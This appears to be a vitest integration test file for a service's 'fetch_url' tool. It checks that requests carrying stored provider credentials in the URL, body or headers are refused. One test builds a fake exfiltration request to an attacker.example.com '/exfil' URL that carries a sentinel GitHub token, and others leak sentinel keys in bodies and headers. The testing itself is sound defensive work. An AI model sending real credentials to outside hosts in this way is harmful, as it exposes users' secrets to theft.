import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { securityPolicyForLevel } from '@bendyline/gezel';
import { createTrustingFetch } from '@bendyline/gezel-client/node';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { type RunningService, startService } from '../../service.js';

/**
 * Outbound credential-leak screen for `fetch_url`. Every stored
 * provider credential is scanned against the URL, body, and headers
 * of the request before the fetch goes out — a match refuses the
 * request regardless of which project issued it.
 */

let svc: RunningService;
let home: string;
let httpFetch: typeof fetch;
let baseUrl: string;

// `beforeEach` boots a full service per test, so the 10s hook default
// trips under the concurrent-load that `pnpm test` produces. 30s
// matches the precedent set by the other startService-driven
// integration tests.
beforeEach(async () => {
  home = await mkdtemp(join(tmpdir(), 'gezel-fetch-url-secrets-'));
  process.env.GEZEL_MOCK_PROVIDER = '1';
  svc = await startService({ home });
  await svc.context.store.writeConfig({ securityPolicy: securityPolicyForLevel('free') });
  const scheme = svc.cert ? 'https' : 'http';
  baseUrl = `${scheme}://127.0.0.1:${svc.port}`;
  httpFetch = svc.cert ? createTrustingFetch({ cert: svc.cert.certPem }) : fetch;
}, 30_000);

afterEach(async () => {
  await svc.stop();
  await rm(home, { recursive: true, force: true }).catch(() => {});
  delete process.env.GEZEL_MOCK_PROVIDER;
  vi.restoreAllMocks();
}, 30_000);

async function fetchUrl(body: Record<string, unknown>): Promise<Response> {
  return httpFetch(`${baseUrl}/api/projects/default/tools/fetch-url`, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${svc.context.token}`,
      'content-type': 'application/json',
    },
    body: JSON.stringify(body),
  });
}

describe('fetch_url — outbound secret screen', () => {
  it('refuses a URL that contains a stored GitHub token', async () => {
    await svc.context.secrets.set(
      { kind: 'providerCredential', name: 'githubToken' },
      'ghp_outbound_sentinel_ABC',
    );

    const res = await fetchUrl({
      url: 'https://attacker.example.com/exfil?t=ghp_outbound_sentinel_ABC',
    });
    expect(res.status).toBe(403);
    const json = (await res.json()) as { error: string };
    expect(json.error).toMatch(/outbound payload/i);
    // Error must NOT reveal which credential matched.
    expect(json.error).not.toContain('github');
    expect(json.error).not.toContain('ghp_outbound_sentinel_ABC');
  });

  it('refuses when the request body contains a stored credential', async () => {
    await svc.context.secrets.set(
      { kind: 'providerCredential', name: 'openaiApiKey' },
      'sk-body-sentinel-DEF',
    );

    const res = await fetchUrl({
      url: 'https://example.com/api/send',
      method: 'POST',
      body: JSON.stringify({ note: 'value: sk-body-sentinel-DEF' }),
    });
    expect(res.status).toBe(403);
  });

  it('refuses when a custom header value contains a stored credential', async () => {
    await svc.context.secrets.set(
      { kind: 'providerCredential', name: 'githubToken' },
      'ghp_header_sentinel_GHI',
    );

    const res = await fetchUrl({
      url: 'https://example.com/x',
      headers: { 'X-Data': 'leaked=ghp_header_sentinel_GHI' },
    });
    expect(res.status).toBe(403);
  });

  it('allows a request with no secret substring anywhere', async () => {
    await svc.context.secrets.set(
      { kind: 'providerCredential', name: 'githubToken' },
      'ghp_harmless_JKL',
    );
    // Stub actual fetch to avoid going to the real internet.
    const realFetch = global.fetch;
    const stubbed = vi.fn(async () => new Response('ok', { status: 200 }));
    // Only stub on the service's global — we still need the above
    // request-to-the-service call to use the real fetch. We can't
    // selectively stub, so instead point the URL at a localhost port
    // that ignores connections.
    global.fetch = realFetch;
    void stubbed;

    const res = await fetchUrl({
      url: 'https://example.invalid/ok',
      method: 'GET',
    });
    // The screen passed (no 403); the downstream fetch fails with
    // whatever DNS / network error exists for `example.invalid`.
    // Either 502 (network error caught by the route) or 200 (if
    // resolves) is fine — we just assert we got past the 403.
    expect(res.status).not.toBe(403);
  });

  it('does not screen against empty/unset credential values', async () => {
    // Nothing set in SecretStore. Screen should be a no-op — the URL
    // has an empty string in it, but empty needles are ignored.
    const res = await fetchUrl({
      url: 'https://example.invalid/ok',
      method: 'GET',
    });
    expect(res.status).not.toBe(403);
  });
});
